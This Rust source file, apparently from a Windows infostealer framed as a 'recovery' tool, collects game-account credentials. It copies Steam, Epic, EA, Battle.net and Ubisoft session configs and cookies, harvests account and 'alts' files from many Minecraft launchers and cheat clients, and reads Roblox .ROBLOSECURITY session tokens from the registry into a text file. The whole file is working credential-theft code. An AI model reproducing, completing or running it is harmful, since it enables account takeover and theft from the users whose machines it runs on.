use crate::recovery::{
    context::RecoveryContext,
    fs::{copy_dir_limited, copy_file, copy_named_dir, sanitize_label},
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use winreg::HKEY;
use winreg::RegKey;
use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};

pub fn gaming_service_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(UbisoftTask {
            source: ctx.local_data_dir.join("Ubisoft Game Launcher"),
        }),
        Arc::new(SteamTask),
        Arc::new(EpicGamesTask(
            ctx.local_data_dir.join("EpicGamesLauncher").join("Saved"),
        )),
        Arc::new(EaTask {
            source: ctx
                .local_data_dir
                .join("Electronic Arts")
                .join("EA Desktop")
                .join("CEF"),
        }),
        Arc::new(BattleNetTask {
            roaming: ctx.roaming_data_dir.join("Battle.net"),
            local: ctx.local_data_dir.join("Battle.net"),
        }),
    ]
}

pub fn gaming_extra_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(MinecraftTask::new(ctx)), Arc::new(RobloxTask)]
}

struct UbisoftTask {
    source: PathBuf,
}

#[async_trait]
impl RecoveryTask for UbisoftTask {
    fn label(&self) -> String {
        "Ubisoft Config".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Gaming
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let dest = gaming_output_dir(ctx, &self.label()).await?;
        let mut artifacts = Vec::new();
        copy_named_dir(&self.label(), &self.source, &dest, &mut artifacts).await?;
        Ok(artifacts)
    }
}

struct SteamTask;

#[async_trait]
impl RecoveryTask for SteamTask {
    fn label(&self) -> String {
        "Steam Sessions".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Gaming
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        if let Some(steam_path) = query_steam_path() {
            let dest = gaming_output_dir(ctx, &self.label()).await?;
            
            // 1. Grab .vdf config files (Session & User info)
            let config_dir = steam_path.join("config");
            copy_files_by_predicate(
                &self.label(),
                &config_dir,
                &dest.join("config"),
                |name| name.ends_with(".vdf"),
                &mut artifacts,
            ).await?;

            // 2. Grab browser cache/cookies (Active login sessions)
            let html_cache = config_dir.join("htmlcache");
            if html_cache.exists() {
                // Grab Cookies and Local Storage
                for target in ["Cookies", "Local Storage", "IndexedDB"] {
                    let source = html_cache.join(target);
                    if source.exists() {
                        let _ = copy_dir_limited(&source, &dest.join("htmlcache").join(target), &self.label(), &mut artifacts, 3, 100).await;
                    }
                }
            }

            // 3. User-specific configs
            let userdata = steam_path.join("userdata");
            if userdata.exists() {
                let _ = copy_dir_limited(&userdata, &dest.join("userdata"), &self.label(), &mut artifacts, 4, 200).await;
            }
        }

        Ok(artifacts)
    }
}

struct EpicGamesTask(PathBuf);

#[async_trait]
impl RecoveryTask for EpicGamesTask {
    fn label(&self) -> String {
        "Epic Games Sessions".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Gaming
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let dest = gaming_output_dir(ctx, &self.label()).await?;
        let mut artifacts = Vec::new();
        
        // Target high-value directories
        for folder in ["Config", "Data", "WebCache"] {
            let source = self.0.join(folder);
            if fs::metadata(&source).await.is_ok() {
                // Limit depth for WebCache to avoid excessive size
                let depth = if folder == "WebCache" { 3 } else { 5 };
                let _ = copy_dir_limited(&source, &dest.join(folder), &self.label(), &mut artifacts, depth, 500).await;
            }
        }
        Ok(artifacts)
    }
}

struct EaTask {
    source: PathBuf,
}

#[async_trait]
impl RecoveryTask for EaTask {
    fn label(&self) -> String {
        "EA Desktop".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Gaming
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let dest = gaming_output_dir(ctx, &self.label()).await?;
        let mut artifacts = Vec::new();
        copy_named_dir(&self.label(), &self.source, &dest, &mut artifacts).await?;
        Ok(artifacts)
    }
}

struct BattleNetTask {
    roaming: PathBuf,
    local: PathBuf,
}

#[async_trait]
impl RecoveryTask for BattleNetTask {
    fn label(&self) -> String {
        "Battle.net Sessions".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Gaming
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest = gaming_output_dir(ctx, &self.label()).await?;
        
        // 1. Roaming data (Accounts & Config)
        if self.roaming.exists() {
            let _ = copy_dir_limited(&self.roaming, &dest.join("Roaming"), &self.label(), &mut artifacts, 5, 500).await;
        }

        // 2. Local data (Web Cache & Cookies)
        if self.local.exists() {
             let _ = copy_dir_limited(&self.local, &dest.join("Local"), &self.label(), &mut artifacts, 3, 500).await;
        }

        Ok(artifacts)
    }
}

async fn gaming_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Gaming")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

async fn copy_files_by_predicate<F>(
    label: &str,
    src: &Path,
    dst: &Path,
    predicate: F,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError>
where
    F: Fn(&str) -> bool,
{
    if !src.exists() {
        return Ok(());
    }

    fs::create_dir_all(dst).await?;
    let mut dir = fs::read_dir(src).await?;
    while let Some(entry) = dir.next_entry().await? {
        if !entry.file_type().await?.is_file() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().to_string();
        if predicate(&name) {
            copy_file(label, &entry.path(), dst, artifacts).await?;
        }
    }

    Ok(())
}

fn query_steam_path() -> Option<PathBuf> {
    let hive = RegKey::predef(HKEY_CURRENT_USER);
    hive.open_subkey(r"Software\Valve\Steam")
        .ok()
        .and_then(|key| key.get_value::<String, _>("SteamPath").ok())
        .map(PathBuf::from)
}

struct MinecraftTask {
    entries: Vec<MinecraftEntry>,
}

impl MinecraftTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            entries: build_minecraft_entries(ctx),
        }
    }
}

#[derive(Clone, Copy)]
enum MinecraftEntryKind {
    File,
    Directory,
}

#[derive(Clone)]
struct MinecraftEntry {
    label: &'static str,
    path: PathBuf,
    kind: MinecraftEntryKind,
}

impl MinecraftEntry {
    fn file(label: &'static str, path: PathBuf) -> Self {
        Self {
            label,
            path,
            kind: MinecraftEntryKind::File,
        }
    }

    fn directory(label: &'static str, path: PathBuf) -> Self {
        Self {
            label,
            path,
            kind: MinecraftEntryKind::Directory,
        }
    }
}

impl MinecraftTask {
    async fn copy_entry(
        &self,
        ctx: &RecoveryContext,
        entry: &MinecraftEntry,
        artifacts: &mut Vec<RecoveryArtifact>,
    ) -> Result<(), RecoveryError> {
        let base = gaming_output_dir(ctx, &self.label()).await?;
        let dest = base.join(sanitize_label(entry.label));
        match fs::metadata(&entry.path).await {
            Ok(metadata) => match entry.kind {
                MinecraftEntryKind::Directory if metadata.is_dir() => {
                    copy_dir_limited(&entry.path, &dest, entry.label, artifacts, usize::MAX, 0)
                        .await?;
                }
                MinecraftEntryKind::File if metadata.is_file() => {
                    copy_file(entry.label, &entry.path, &dest, artifacts).await?;
                }
                _ => {}
            },
            Err(_) => {}
        }

        Ok(())
    }
}

#[async_trait]
impl RecoveryTask for MinecraftTask {
    fn label(&self) -> String {
        "Minecraft Profiles".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Gaming
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        for entry in &self.entries {
            self.copy_entry(ctx, entry, &mut artifacts).await?;
        }
        Ok(artifacts)
    }
}

fn build_minecraft_entries(ctx: &RecoveryContext) -> Vec<MinecraftEntry> {
    let app_data = ctx.roaming_data_dir.clone();
    let user_profile = ctx.home_dir.clone();

    vec![
        MinecraftEntry::file(
            "Vanilla Profiles",
            app_data.join(".minecraft").join("launcher_profiles.json"),
        ),
        MinecraftEntry::file(
            "Vanilla Accounts",
            app_data.join(".minecraft").join("launcher_accounts.json"),
        ),
        MinecraftEntry::directory("Saves", app_data.join(".minecraft").join("saves")),
        MinecraftEntry::directory("Logs", app_data.join(".minecraft").join("logs")),
        MinecraftEntry::directory(
            "Crash Reports",
            app_data.join(".minecraft").join("crash-reports"),
        ),
        MinecraftEntry::file(
            "Intent Launcher",
            user_profile.join("intentlauncher").join("launcherconfig"),
        ),
        MinecraftEntry::file(
            "Lunar Client",
            user_profile
                .join(".lunarclient")
                .join("settings")
                .join("game")
                .join("accounts.json"),
        ),
        MinecraftEntry::file(
            "TLauncher",
            app_data.join(".minecraft").join("TlauncherProfiles.json"),
        ),
        MinecraftEntry::file("Feather", app_data.join(".feather").join("accounts.json")),
        MinecraftEntry::file(
            "Meteor",
            app_data
                .join(".minecraft")
                .join("meteor-client")
                .join("accounts.nbt"),
        ),
        MinecraftEntry::file(
            "Impact",
            app_data.join(".minecraft").join("Impact").join("alts.json"),
        ),
        MinecraftEntry::file(
            "Novoline",
            app_data
                .join(".minecraft")
                .join("Novoline")
                .join("alts.novo"),
        ),
        MinecraftEntry::file(
            "CheatBreakers",
            app_data
                .join(".minecraft")
                .join("cheatbreaker_accounts.json"),
        ),
        MinecraftEntry::file(
            "Microsoft Store",
            app_data
                .join(".minecraft")
                .join("launcher_accounts_microsoft_store.json"),
        ),
        MinecraftEntry::file(
            "Rise",
            app_data.join(".minecraft").join("Rise").join("alts.txt"),
        ),
        MinecraftEntry::file(
            "Rise (Intent)",
            user_profile
                .join("intentlauncher")
                .join("Rise")
                .join("alts.txt"),
        ),
        MinecraftEntry::file(
            "Paladium",
            app_data.join("paladium-group").join("accounts.json"),
        ),
        MinecraftEntry::file("PolyMC", app_data.join("PolyMC").join("accounts.json")),
        MinecraftEntry::file(
            "Badlion",
            app_data.join("Badlion Client").join("accounts.json"),
        ),
        MinecraftEntry::file(
            "Prism",
            app_data.join("PrismLauncher").join("accounts.json"),
        ),
        MinecraftEntry::file(
            "Prism Profiles",
            app_data.join("PrismLauncher").join("profiles.json"),
        ),
        MinecraftEntry::file(
            "GDLauncher",
            app_data.join("gdlauncher_next").join("localStorage.json"),
        ),
        MinecraftEntry::file(
            "ATLauncher",
            app_data.join(".atlauncher").join("accounts.json"),
        ),
        MinecraftEntry::file(
            "Technic",
            app_data.join(".technic").join("launcher_profiles.json"),
        ),
        MinecraftEntry::file("MultiMC", app_data.join("MultiMC").join("accounts.json")),
        MinecraftEntry::directory(
            "MultiMC Instances",
            app_data.join("MultiMC").join("instances"),
        ),
        MinecraftEntry::directory(
            "CurseForge Instances",
            app_data
                .join("curseforge")
                .join("minecraft")
                .join("Instances"),
        ),
        MinecraftEntry::directory("Forge Mods", app_data.join(".minecraft").join("mods")),
    ]
}

struct RobloxTask;

impl RobloxTask {
    fn collect_tokens() -> Vec<(String, String)> {
        const REGISTRY_PATH: &str = r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com";
        const VALUE_NAME: &str = ".ROBLOSECURITY";
        const SOURCES: [(&str, HKEY); 2] =
            [("HKCU", HKEY_CURRENT_USER), ("HKLM", HKEY_LOCAL_MACHINE)];

        let mut results = Vec::new();
        for (label, hive) in SOURCES {
            if let Some(value) = read_registry_value(hive, REGISTRY_PATH, VALUE_NAME) {
                let trimmed = value.trim();
                if !trimmed.is_empty() {
                    results.push((label.to_string(), trimmed.to_string()));
                }
            }
        }

        results
    }
}

fn read_registry_value(hive: HKEY, path: &str, value_name: &str) -> Option<String> {
    RegKey::predef(hive)
        .open_subkey(path)
        .ok()
        .and_then(|key| key.get_value::<String, _>(value_name).ok())
}

#[async_trait]
impl RecoveryTask for RobloxTask {
    fn label(&self) -> String {
        "Roblox Sessions".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Gaming
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let tokens = Self::collect_tokens();
        if tokens.is_empty() {
            return Ok(Vec::new());
        }

        let dest = gaming_output_dir(ctx, &self.label()).await?;
        let target = dest.join("Content.txt");
        let mut builder = String::new();
        for (source, token) in tokens {
            builder.push_str(&format!("{source}: {token}\n"));
        }

        fs::create_dir_all(&dest).await?;
        fs::write(&target, builder).await?;
        let meta = fs::metadata(&target).await?;

        Ok(vec![RecoveryArtifact {
            label: self.label(),
            path: target,
            size_bytes: meta.len(),
            modified: meta.modified().ok(),
        }])
    }
}
